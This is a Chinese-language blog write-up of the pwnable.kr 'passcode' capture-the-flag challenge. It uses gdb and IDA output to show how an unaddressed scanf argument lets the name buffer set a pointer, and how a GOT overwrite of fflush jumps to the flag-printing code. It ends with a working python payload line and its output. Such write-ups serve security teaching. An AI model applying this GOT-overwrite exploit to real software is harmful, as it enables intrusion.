---
layout: post
title: PwnableKr Passcode
---
> Mommy told me to make a passcode based login system.
> 
> My initial C code was compiled without any error!
> 
> Well, there was some compiler warning, but who cares about that?

Compile:

	ssh passcode@pwnable.kr -p2222 (pw:guest)
	-r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
	-r-xr-sr-x 1 root passcode_pwn 7485 Jun 26  2014 passcode
	-rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c
	passcode@ubuntu:~$ cat passcode.c
	
	test@n0tr00t:~/pwn$ gcc -g pass.c -m32 -o pass

由于可以拿到源代码直接分析可以看到 scanf 的参数没有加地址符号，限制 name 100位，gdb 分析查看栈情况以及 name, pass1, pass2 的布局，直接对 welcome 和 login 下断点：

	gdb-peda$ disas main
	Dump of assembler code for function main:
      0x08048665 <+0>: push   ebp
      0x08048666 <+1>: mov    ebp,esp
      0x08048668 <+3>: and    esp,0xfffffff0
      0x0804866b <+6>: sub    esp,0x10
      0x0804866e <+9>: mov    DWORD PTR [esp],0x80487f0
      0x08048675 <+16>:    call   0x8048450 <puts@plt>
      0x0804867a <+21>:    call   0x8048609 <welcome>
      0x0804867f <+26>:    call   0x8048564 <login>
      0x08048684 <+31>:    mov    DWORD PTR [esp],0x8048818
      0x0804868b <+38>:    call   0x8048450 <puts@plt>
      0x08048690 <+43>:    mov    eax,0x0
      0x08048695 <+48>:    leave  
      0x08048696 <+49>:    ret  

    gdb-peda$ b welcome
      Breakpoint 3 at 0x8048612: file pass.c, line 27.
    gdb-peda$ b login
      Breakpoint 4 at 0x804856a: file pass.c, line 8.
    gdb-peda$ i b
      Num     Type           Disp Enb Address    What
      3       breakpoint     keep y   0x08048612 in welcome at pass.c:27
      4       breakpoint     keep y   0x0804856a in login at pass.c:8

在第一个断点处走到 scanf("%100s", name) 时可以看到对应汇编的情况：

      0x8048625 <welcome+28>: call   0x8048420 <printf@plt>
    =>0x804862a <welcome+33>: mov    eax,0x80487dd
      0x804862f <welcome+38>: lea    edx,[ebp-0x70]
      
x/s 0x80487dd => 0x80487dd:	 "%100s" , name 地址为 ebp-0x70：

	gdb-peda$ x $ebp-0x70
	0xffffd1c8:	 'a' <repeats 21 times>
	
passcode1 地址为 ebp-0x10 （开始在 winod 调试的时候进入 login 堆栈平衡会用 c 填覆盖填充区域，导致撞了半天墙。），由于他们在相同栈内应该能够覆盖，计算两者距离 0x70-0x10=96 ，name[100] 限制目前能覆盖4字节的 passcode1 地址。

   	gdb-peda$ x/20 $ebp-0x30
    0xffffd208: 0x61616161  0x61616161  0x61616161  0x61616161
    0xffffd218: 0x61616161  0x61616161  0x61616161  0x61616161
    0xffffd228: 0x62626262  0x8e658f00  0x00000000  0x00000000
    0xffffd238: 0xffffd258  0x08048684  0x080487f0  0x00000000
    0xffffd248: 0x080486a9  0xf7fc1ff4  0x080486a0  0x00000000

    gdb-peda$ x $ebp-0x10
    0xffffd228: 0x62626262

    gdb-peda$ x/s 0xffffd228
    0xffffd228:  "bbbb"
   
位置稍微远了点所以想直接利用 scanf 的功能特性 hook 函数，来到源码：
	
	void login(){
		int passcode1;
		int passcode2;
	
		printf("enter passcode1 : ");
		scanf("%d", passcode1);
		fflush(stdin);

scanf 执行完毕后会调用 fflush 清空缓冲区，所以直接搞它吧，丢 ida 查 .got 表地址：

![](https://ws1.sinaimg.cn/large/c334041bgy1fdoq3t3u0wj218y0bs78f)

off_804A004 fflush ，随便找一个读 flag 操作的汇编地址，反正按序执行 xD ：

    .text:080485CE                 cmp     [ebp+passcode2], 0CC07C9h
    .text:080485D5                 jnz     short loc_80485F1
    .text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; "Login OK!"
    .text:080485DE                 call    _puts
    .text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
    .text:080485EA                 call    _system
    .text:080485EF                 leave
    .text:080485F0                 retn
    
使用 Print Login OK 那条地址覆盖吧，fflush addr 804A004 = 080485D7， scanf 使用的是 %d 十进制，需要转换一下：134514135 ，Payload：

	passcode@ubuntu:~$ python -c "print 'a'*96 + '\x04\xa0\x04\x08' + '134514135'" | ./passcode
	Toddler's Secure Login System 1.0 beta.
	enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
	enter passcode1 : Login OK!
	Sorry mom.. I got confused about scanf usage :(
	Now I can safely trust you that you have credential :)
